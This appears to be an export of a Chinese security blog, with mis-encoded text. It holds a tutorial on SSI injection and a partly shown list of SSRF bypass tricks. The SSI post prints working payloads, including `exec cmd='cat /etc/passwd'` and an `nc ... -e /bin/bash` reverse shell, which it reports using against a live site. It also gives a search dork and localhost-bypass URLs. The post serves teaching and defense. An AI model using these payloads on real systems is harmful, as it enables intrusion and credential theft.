      <url>/2018/01/05/SSI-%E6%9C%8D%E5%8A%A1%E5%99%A8%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</url>
      <content type="html"><![CDATA[<p>å‰æ®µæ—¶é—´åˆšå¥½åœ¨ä¸€ç¯‡æ–‡ç« ä¸­çœ‹åˆ°äº†ä¸€ä¸ªSSIçš„æ–‡ç« ï¼Œç°åœ¨è¿™ç§ä¸šåŠ¡åŸºæœ¬ä¸Šå¾ˆå°‘è§äº†ï¼Œä¹‹å‰ä¹Ÿæ²¡äº†è§£è¿‡(åŸè°…æˆ‘æ˜¯èœé¸¡â€”_-!)æ²¡ç•™æ„è¿‡ã€‚è¿æ°”å¥½ï¼Œåˆšå¥½åœ¨å¾®åšä¸Šç»™é‡åˆ°äº†ï¼Œæ‰€ä»¥è®°å½•ä¸‹å­¦ä¹ è¿‡ç¨‹ã€‚<br><a id="more"></a></p>
<h1 id="0x01-å…³äºSSI"><a href="#0x01-å…³äºSSI" class="headerlink" title="0x01 å…³äºSSI"></a>0x01 å…³äºSSI</h1><p>SSIæ˜¯è‹±æ–‡â€Server Side Includesâ€çš„ç¼©å†™ï¼Œç¿»è¯‘æˆä¸­æ–‡å°±æ˜¯æœåŠ¡å™¨ç«¯åŒ…å«çš„æ„æ€ã€‚SSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚</p>
<p>ä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚</p>
<h2 id="1-1-å¯ç”¨SSI"><a href="#1-1-å¯ç”¨SSI" class="headerlink" title="1.1 å¯ç”¨SSI"></a>1.1 å¯ç”¨SSI</h2><p><strong>ç¤ºä¾‹ï¼šNginx é…ç½®SSIåŠŸèƒ½</strong></p>
<p>åœ¨httpæ®µä¸­åŠ å…¥ä¸‹é¢å‡ å¥å³å¯ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">ssi on;</div><div class="line">ssi_silent_errors off;</div><div class="line">ssi_types text/shtml;</div></pre></td></tr></table></figure></p>
<p>é»˜è®¤Apacheä¸å¼€å¯SSIï¼ŒSSIè¿™ç§æŠ€æœ¯å·²ç»æ¯”è¾ƒå°‘ç”¨äº†ã€‚å¦‚æœåº”ç”¨æ²¡æœ‰ä½¿ç”¨åˆ°SSIï¼Œå…³é—­æœåŠ¡å™¨å¯¹SSIçš„æ”¯æŒå³å¯ã€‚</p>
<p>IISå’ŒApacheéƒ½å¯ä»¥å¼€å¯SSIåŠŸèƒ½ï¼Œå…·ä½“å¯å‚è€ƒ:<a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="external">http://m.jb51.net/article/25725.htm</a></p>
<h2 id="1-2-SSIè¯­æ³•"><a href="#1-2-SSIè¯­æ³•" class="headerlink" title="1.2 SSIè¯­æ³•"></a>1.2 SSIè¯­æ³•</h2><p>é¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">1ã€æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡&lt;#echo&gt;</div><div class="line"></div><div class="line">æœ¬æ–‡æ¡£åç§°ï¼š</div><div class="line">&lt;!â€“#echo var=&quot;DOCUMENT_NAME&quot;â€“&gt;</div><div class="line">ç°åœ¨æ—¶é—´ï¼š</div><div class="line">&lt;!â€“#echo var=&quot;DATE_LOCAL&quot;â€“&gt;</div><div class="line">æ˜¾ç¤ºIPåœ°å€&lt;/ins&gt;</div><div class="line">&lt;! #echo var=&quot;REMOTE_ADDR&quot;â€“&gt;</div><div class="line"></div><div class="line">2ã€å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­&lt;#include&gt;</div><div class="line"></div><div class="line">&lt;! #include file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line">&lt;!--#include virtual=&quot;index.html&quot; --&gt;</div><div class="line">&lt;! #include virtual=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line">&lt;!--#include virtual=&quot;/www/footer.html&quot; --&gt;</div><div class="line">æ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„</div><div class="line"></div><div class="line">3ã€æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯&lt;#flastmod&gt;&lt;#fsize&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰)</div><div class="line"></div><div class="line">æ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š</div><div class="line">&lt;! #flastmod file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line">æ–‡ä»¶çš„é•¿åº¦ï¼š</div><div class="line">&lt;!â€“#fsize file=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line"></div><div class="line">4ã€ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº&lt;#exec&gt;(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº)</div><div class="line"></div><div class="line">&lt;!â€“#exec cmd=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line">&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</div><div class="line">&lt;!â€“#exec cgi=&quot;æ–‡ä»¶åç§°&quot;â€“&gt;</div><div class="line">&lt;!--#exec cgi=&quot;/cgi-bin/access_log.cgi</div><div class="line"></div><div class="line">å°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚</div><div class="line"></div><div class="line">5ã€è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼&lt;#config&gt;(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼)</div><div class="line"></div><div class="line">6ã€é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚</div></pre></td></tr></table></figure></p>
<p>æ›´å¤šè¯·å‚è€ƒï¼š<a href="http://www.javaeye.com/topic/306216" target="_blank" rel="external">http://www.javaeye.com/topic/306216</a></p>
<h1 id="0x02-æ¼æ´åœºæ™¯"><a href="#0x02-æ¼æ´åœºæ™¯" class="headerlink" title="0x02 æ¼æ´åœºæ™¯"></a>0x02 æ¼æ´åœºæ™¯</h1><p>åœ¨å¾ˆå¤šä¸šåŠ¡ä¸­ï¼Œç”¨æˆ·è¾“å…¥çš„å†…å®¹ä¼šæ˜¾ç¤ºåœ¨é¡µé¢ä¸­ã€‚æ¯”å¦‚ï¼Œä¸€ä¸ªå­˜åœ¨åå°„å‹XSSæ¼æ´çš„é¡µé¢ï¼Œå¦‚æœè¾“å…¥çš„payloadä¸æ˜¯XSSä»£ç è€Œæ˜¯SSIçš„æ ‡ç­¾ï¼ŒåŒæ—¶æœåŠ¡å™¨åˆå¼€å¯äº†å¯¹SSIçš„æ”¯æŒçš„è¯å°±ä¼šå­˜åœ¨SSIæ¼æ´ã€‚</p>
<p>ä»å®šä¹‰ä¸­çœ‹å‡ºï¼Œé¡µé¢ä¸­æœ‰ä¸€å°éƒ¨åˆ†æ˜¯åŠ¨æ€è¾“å‡ºçš„æ—¶å€™ä½¿ç”¨SSIï¼Œ<br>æ¯”å¦‚ï¼š<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">æ–‡ä»¶ç›¸å…³çš„å±æ€§å­—æ®µ</div><div class="line">å½“å‰æ—¶é—´</div><div class="line">è®¿å®¢IP</div><div class="line">è°ƒç”¨CGIç¨‹åº</div></pre></td></tr></table></figure></p>
<h1 id="0x03-SSIæ³¨å…¥çš„æ¡ä»¶"><a href="#0x03-SSIæ³¨å…¥çš„æ¡ä»¶" class="headerlink" title="0x03 SSIæ³¨å…¥çš„æ¡ä»¶"></a>0x03 SSIæ³¨å…¥çš„æ¡ä»¶</h1><p>å½“ç¬¦åˆä¸‹åˆ—æ¡ä»¶æ—¶ï¼Œæ”»å‡»è€…å¯ä»¥åœ¨ Web æœåŠ¡å™¨ä¸Šè¿è¡Œä»»æ„å‘½ä»¤ï¼š</p>
<ul>
<li>Web æœåŠ¡å™¨å·²æ”¯æŒSSIï¼ˆæœåŠ¡å™¨ç«¯åŒ…å«ï¼‰</li>
<li>Web åº”ç”¨ç¨‹åºæœªå¯¹å¯¹ç›¸å…³SSIå…³é”®å­—åšè¿‡æ»¤</li>
<li>Web åº”ç”¨ç¨‹åºåœ¨è¿”å›å“åº”çš„HTMLé¡µé¢æ—¶ï¼ŒåµŒå…¥ç”¨æˆ·è¾“å…¥</li>
</ul>
<p>SSIæ³¨å…¥å¸¸ç”¨å‘½ä»¤ï¼š</p>
<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="external">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
<h1 id="0x04-SSIæŒ–æ˜æ€è·¯"><a href="#0x04-SSIæŒ–æ˜æ€è·¯" class="headerlink" title="0x04 SSIæŒ–æ˜æ€è·¯"></a>0x04 SSIæŒ–æ˜æ€è·¯</h1><p><strong>ä¸¤ä¸ªæ€è·¯ï¼š</strong></p>
<ul>
<li>ä»ä¸šåŠ¡åœºæ™¯æ¥Fuzzï¼Œæ¯”å¦‚è·å–IPã€å®šä½ã€æ—¶é—´ç­‰</li>
<li>è¯†åˆ«é¡µé¢æ˜¯å¦åŒ…å«.stm,.shtmå’Œ.shtmlåç¼€</li>
</ul>
<p>google dorkï¼š<code>inurl:bin/cklb</code></p>
<h1 id="0x05-SSIæ¼æ´å¤ç°"><a href="#0x05-SSIæ¼æ´å¤ç°" class="headerlink" title="0x05 SSIæ¼æ´å¤ç°"></a>0x05 SSIæ¼æ´å¤ç°</h1><h2 id="5-1-æœ¬åœ°æµ‹è¯•"><a href="#5-1-æœ¬åœ°æµ‹è¯•" class="headerlink" title="5.1 æœ¬åœ°æµ‹è¯•"></a>5.1 æœ¬åœ°æµ‹è¯•</h2><p>æˆ‘ä»¬ä½¿ç”¨bWAPPæ¥åšæ¼æ´æ¼”ç¤ºç¯å¢ƒ<br>é€‰æ‹©ï¼š<code>Server-Side Includes (SSI) Injection</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-0.png" alt=""><br>è¾“å…¥ä¸ªXSSçš„payloadï¼š<code>&lt;script&gt;alert(1)&lt;/script&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-1.png" alt=""><br>æˆåŠŸæ‰§è¡Œäº†ä»£ç ã€‚</p>
<p>å†ä½¿ç”¨ä¸‹execæŒ‡ä»¤ä½¿ç”¨cmdä½œä¸ºå‚æ•°æ‰§è¡ŒæœåŠ¡å™¨ç«¯å‘½ä»¤ï¼š<code>&lt;!--#exec cmd=&quot;ls -al&quot;--&gt;</code><br><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-2.png" alt=""></p>
<h2 id="5-2-æ¼æ´æŒ–æ˜"><a href="#5-2-æ¼æ´æŒ–æ˜" class="headerlink" title="5.2 æ¼æ´æŒ–æ˜"></a>5.2 æ¼æ´æŒ–æ˜</h2><p>è¿æ°”å¥½ï¼Œåˆšå¥½é‡åˆ°ä¸ªå¾®åšçš„ã€‚<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;cat /etc/passwd&quot;--&gt;</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-3.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">&quot;--&gt;&apos;--&gt;`--&gt;&lt;&lt;!--#exec cmd=&quot;nc x.x.x.x 9090 -e /bin/bash&quot;--&gt;</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/ssi-4.jpg" alt=""></p>
<h1 id="0x06-SSIé˜²å¾¡"><a href="#0x06-SSIé˜²å¾¡" class="headerlink" title="0x06 SSIé˜²å¾¡"></a>0x06 SSIé˜²å¾¡</h1><ul>
<li>å…³é—­æœåŠ¡å™¨SSIåŠŸèƒ½</li>
<li>è¿‡æ»¤ç›¸å…³SSIç‰¹æ®Šå­—ç¬¦ï¼ˆ<code>&lt;,&gt;,#,-,&quot;,&#39;</code>ï¼‰</li>
</ul>
<p>å…·ä½“è¯·å‚è€ƒï¼š<br><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="external">SSI æ³¨å…¥çš„ä»‹ç»å’Œä»£ç é˜²å¾¡</a></p>
<h2 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h2><p><a href="http://m.jb51.net/article/25725.htm" target="_blank" rel="external">http://m.jb51.net/article/25725.htm</a></p>
<p><a href="http://www.kubiji.cn/topic-id998.html" target="_blank" rel="external">http://www.kubiji.cn/topic-id998.html</a></p>
<p><a href="https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection" target="_blank" rel="external">https://www.owasp.org/index.php/Server-Side_Includes_(SSI)_Injection</a></p>
<p><a href="http://www.mottoin.com/101526.html" target="_blank" rel="external">http://www.mottoin.com/101526.html</a></p>
<p><a href="http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/" target="_blank" rel="external">http://www.evilclay.com/2017/04/28/SSI-%E6%9C%8D%E5%8A%A1%E7%AB%AF%E5%8C%85%E5%90%AB%E6%B3%A8%E5%85%A5/</a></p>
<p><a href="http://blog.csdn.net/qq_29277155/article/details/52751364" target="_blank" rel="external">http://blog.csdn.net/qq_29277155/article/details/52751364</a></p>
]]></content>
      
        
        <tags>
            
            <tag> è‡ªåŠ¨åŒ– </tag>
            
            <tag> å‘½ä»¤æ‰§è¡Œ </tag>
            
            <tag> æ¼æ´æŒ–æ˜ </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[SSRFç»•è¿‡æ–¹æ³•æ€»ç»“]]></title>
      <url>/2017/11/21/SSRF%E7%BB%95%E8%BF%87%E6%96%B9%E6%B3%95%E6%80%BB%E7%BB%93/</url>
      <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><blockquote>
<p>æ˜¨å¤©å¿˜äº†åœ¨å…¬ä¼—å·è¿˜æ˜¯å¾®åšä¸Šçœ‹åˆ°çš„äº†ï¼Œçœ‹åˆ°ä¸€ä¸ªSSRFç»•è¿‡çš„æŠ€å·§ï¼Œä½¿ç”¨çš„æ˜¯<code>â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ</code>ç»•è¿‡çš„ï¼Œè‡ªå·±ä¹Ÿæ²¡é‡åˆ°è¿‡ã€‚ç„¶åæƒ³æƒ³è‡ªå·±å¯¹SSRFç»•è¿‡è¿˜æ˜¯åœç•™åœ¨ä¹‹å‰çš„äº†è§£ï¼Œä¹Ÿæ²¡å­¦ä¹ è¿‡æ–°çš„ç»•è¿‡æ–¹æ³•ï¼Œæ‰€ä»¥ç‰¹æ„æ‰¾äº†æ‰¾èµ„æ–™ï¼Œå­¦ä¹ å­¦ä¹ æœ€æ–°é»‘ç§‘æŠ€ï¼Œå……å……èƒ½ã€‚</p>
</blockquote>
<a id="more"></a>
<h1 id="0x00-SSRFæ˜¯ä»€ä¹ˆ"><a href="#0x00-SSRFæ˜¯ä»€ä¹ˆ" class="headerlink" title="0x00 SSRFæ˜¯ä»€ä¹ˆ"></a>0x00 SSRFæ˜¯ä»€ä¹ˆ</h1><p>èƒ½ç²¾ç®€çš„å°±ä¸æ‰¯æ·¡ï¼Œä¸€å¥è¯å°±æ˜¯ï¼šåˆ©ç”¨ä¸€ä¸ªå¯ä»¥å‘èµ·ç½‘ç»œè¯·æ±‚çš„æœåŠ¡å½“ä½œè·³æ¿æ¥æ”»å‡»å†…éƒ¨å…¶ä»–æœåŠ¡ã€‚</p>
<h1 id="0x01-SSRFèƒ½å¹²ä»€ä¹ˆ"><a href="#0x01-SSRFèƒ½å¹²ä»€ä¹ˆ" class="headerlink" title="0x01 SSRFèƒ½å¹²ä»€ä¹ˆ"></a>0x01 SSRFèƒ½å¹²ä»€ä¹ˆ</h1><ul>
<li>æ¢æµ‹å†…ç½‘ä¿¡æ¯</li>
<li>æ”»å‡»å†…ç½‘æˆ–æœ¬åœ°å…¶ä»–æœåŠ¡</li>
<li>ç©¿é€é˜²ç«å¢™</li>
<li>ã€‚ã€‚ã€‚</li>
</ul>
<h1 id="0x02-SSRFæ€ä¹ˆæ‰¾"><a href="#0x02-SSRFæ€ä¹ˆæ‰¾" class="headerlink" title="0x02 SSRFæ€ä¹ˆæ‰¾"></a>0x02 SSRFæ€ä¹ˆæ‰¾</h1><ul>
<li>èƒ½å¤Ÿå¯¹å¤–å‘èµ·ç½‘ç»œè¯·æ±‚çš„åœ°æ–¹</li>
<li>è¯·æ±‚è¿œç¨‹æœåŠ¡å™¨èµ„æºçš„åœ°æ–¹</li>
<li>æ•°æ®åº“å†…ç½®åŠŸèƒ½</li>
<li>é‚®ä»¶ç³»ç»Ÿ</li>
<li>æ–‡ä»¶å¤„ç†</li>
<li>åœ¨çº¿å¤„ç†å·¥å…·</li>
<li>ã€‚ã€‚ã€‚</li>
</ul>
<p><strong>ä¸¾å‡ ä¸ªä¾‹å­ï¼š</strong></p>
<ul>
<li>åœ¨çº¿è¯†å›¾ï¼Œåœ¨çº¿æ–‡æ¡£ç¿»è¯‘ï¼Œåˆ†äº«ï¼Œè®¢é˜…ç­‰ï¼Œè¿™äº›æœ‰çš„éƒ½ä¼šå‘èµ·ç½‘ç»œè¯·æ±‚ã€‚</li>
<li>æ ¹æ®è¿œç¨‹URLä¸Šä¼ ï¼Œé™æ€èµ„æºå›¾ç‰‡ç­‰ï¼Œè¿™äº›ä¼šè¯·æ±‚è¿œç¨‹æœåŠ¡å™¨çš„èµ„æºã€‚</li>
<li>æ•°æ®åº“çš„æ¯”å¦‚mongodbçš„copyDatabaseå‡½æ•°ï¼Œè¿™ç‚¹çœ‹çŒªçŒªä¾ è®²çš„å§ï¼Œæ²¡å®è·µè¿‡ã€‚</li>
<li>é‚®ä»¶ç³»ç»Ÿå°±æ˜¯æ¥æ”¶é‚®ä»¶æœåŠ¡å™¨åœ°å€è¿™äº›åœ°æ–¹ã€‚</li>
<li>æ–‡ä»¶å°±æ‰¾ImageMagickï¼Œxmlè¿™äº›ã€‚</li>
<li>ä»URLå…³é”®å­—ä¸­å¯»æ‰¾ï¼Œæ¯”å¦‚ï¼šsource,share,link,src,imageurl,targetç­‰ã€‚</li>
</ul>
<p>ä»¥ä¸Šè¿™äº›ä¸æ˜¯æœ¬æ–‡çš„é‡ç‚¹ï¼Œä¸‹é¢è¯´ä¸‹é‡ç‚¹ä»‹ç»çš„SSRFç»•è¿‡çš„æ–¹æ³•ã€‚</p>
<h1 id="0x03-SSRFæ€ä¹ˆç»•"><a href="#0x03-SSRFæ€ä¹ˆç»•" class="headerlink" title="0x03 SSRFæ€ä¹ˆç»•"></a>0x03 SSRFæ€ä¹ˆç»•</h1><h2 id="1ã€æ”»å‡»æœ¬åœ°"><a href="#1ã€æ”»å‡»æœ¬åœ°" class="headerlink" title="1ã€æ”»å‡»æœ¬åœ°"></a>1ã€æ”»å‡»æœ¬åœ°</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1:80</div><div class="line">http://localhost:22</div></pre></td></tr></table></figure>
<h2 id="2ã€åˆ©ç”¨"><a href="#2ã€åˆ©ç”¨" class="headerlink" title="2ã€åˆ©ç”¨[::]"></a>2ã€åˆ©ç”¨<code>[::]</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">åˆ©ç”¨[::]ç»•è¿‡localhost</div><div class="line">http://[::]:80/  &gt;&gt;&gt;  http://127.0.0.1</div><div class="line">ä¹Ÿæœ‰çœ‹åˆ°åˆ©ç”¨http://0000::1:80/çš„ï¼Œä½†æ˜¯æˆ‘æµ‹è¯•æœªæˆåŠŸ</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/11.png" alt=""></p>
<h2 id="3ã€åˆ©ç”¨"><a href="#3ã€åˆ©ç”¨" class="headerlink" title="3ã€åˆ©ç”¨@"></a>3ã€åˆ©ç”¨<code>@</code></h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://example.com@127.0.0.1</div></pre></td></tr></table></figure>
<h2 id="4ã€åˆ©ç”¨çŸ­åœ°å€"><a href="#4ã€åˆ©ç”¨çŸ­åœ°å€" class="headerlink" title="4ã€åˆ©ç”¨çŸ­åœ°å€"></a>4ã€åˆ©ç”¨çŸ­åœ°å€</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://dwz.cn/11SMa  &gt;&gt;&gt;  http://127.0.0.1</div></pre></td></tr></table></figure>
<h2 id="5ã€åˆ©ç”¨ç‰¹æ®ŠåŸŸå"><a href="#5ã€åˆ©ç”¨ç‰¹æ®ŠåŸŸå" class="headerlink" title="5ã€åˆ©ç”¨ç‰¹æ®ŠåŸŸå"></a>5ã€åˆ©ç”¨ç‰¹æ®ŠåŸŸå</h2><p>åˆ©ç”¨çš„åŸç†æ˜¯DNSè§£æ<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/1.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://www.owasp.org.127.0.0.1.xip.io/</div></pre></td></tr></table></figure></p>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/2.png" alt=""></p>
<h2 id="6ã€åˆ©ç”¨DNSè§£æ"><a href="#6ã€åˆ©ç”¨DNSè§£æ" class="headerlink" title="6ã€åˆ©ç”¨DNSè§£æ"></a>6ã€åˆ©ç”¨DNSè§£æ</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">åœ¨åŸŸåä¸Šè®¾ç½®Aè®°å½•ï¼ŒæŒ‡å‘127.0.1</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/3.png" alt=""></p>
<h2 id="7ã€åˆ©ç”¨ä¸Šä¼ "><a href="#7ã€åˆ©ç”¨ä¸Šä¼ " class="headerlink" title="7ã€åˆ©ç”¨ä¸Šä¼ "></a>7ã€åˆ©ç”¨ä¸Šä¼ </h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">ä¹Ÿä¸ä¸€å®šæ˜¯ä¸Šä¼ ï¼Œæˆ‘ä¹Ÿè¯´ä¸æ¸…ï¼Œè‡ªå·±ä½“ä¼š -.-</div><div class="line">ä¿®æ”¹&quot;type=file&quot;ä¸º&quot;type=url&quot;</div><div class="line">æ¯”å¦‚ï¼š</div><div class="line">ä¸Šä¼ å›¾ç‰‡å¤„ä¿®æ”¹ä¸Šä¼ ï¼Œå°†å›¾ç‰‡æ–‡ä»¶ä¿®æ”¹ä¸ºURLï¼Œå³å¯èƒ½è§¦å‘SSRF</div></pre></td></tr></table></figure>
<h2 id="8ã€åˆ©ç”¨Enclosed-alphanumerics"><a href="#8ã€åˆ©ç”¨Enclosed-alphanumerics" class="headerlink" title="8ã€åˆ©ç”¨Enclosed alphanumerics"></a>8ã€åˆ©ç”¨Enclosed alphanumerics</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">åˆ©ç”¨Enclosed alphanumerics</div><div class="line">â“”â“§â“â“œâ“Ÿâ“›â“”.â“’â“â“œ  &gt;&gt;&gt;  example.com</div><div class="line">List:</div><div class="line">â‘  â‘¡ â‘¢ â‘£ â‘¤ â‘¥ â‘¦ â‘§ â‘¨ â‘© â‘ª â‘« â‘¬ â‘­ â‘® â‘¯ â‘° â‘± â‘² â‘³ â‘´ â‘µ â‘¶ â‘· â‘¸ â‘¹ â‘º â‘» â‘¼ â‘½ â‘¾ â‘¿ â’€ â’ â’‚ â’ƒ â’„ â’… â’† â’‡ â’ˆ â’‰ â’Š â’‹ â’Œ â’ â’ â’ â’ â’‘ â’’ â’“ â’” â’• â’– â’— â’˜ â’™ â’š â’› â’œ â’ â’ â’Ÿ â’  â’¡ â’¢ â’£ â’¤ â’¥ â’¦ â’§ â’¨ â’© â’ª â’« â’¬ â’­ â’® â’¯ â’° â’± â’² â’³ â’´ â’µ â’¶ â’· â’¸ â’¹ â’º â’» â’¼ â’½ â’¾ â’¿ â“€ â“ â“‚ â“ƒ â“„ â“… â“† â“‡ â“ˆ â“‰ â“Š â“‹ â“Œ â“ â“ â“ â“ â“‘ â“’ â““ â“” â“• â“– â“— â“˜ â“™ â“š â“› â“œ â“ â“ â“Ÿ â“  â“¡ â“¢ â“£ â“¤ â“¥ â“¦ â“§ â“¨ â“© â“ª â“« â“¬ â“­ â“® â“¯ â“° â“± â“² â“³ â“´ â“µ â“¶ â“· â“¸ â“¹ â“º â“» â“¼ â“½ â“¾ â“¿</div></pre></td></tr></table></figure>
<p><img src="http://oa8y5guqs.bkt.clouddn.com/4.png" alt=""></p>
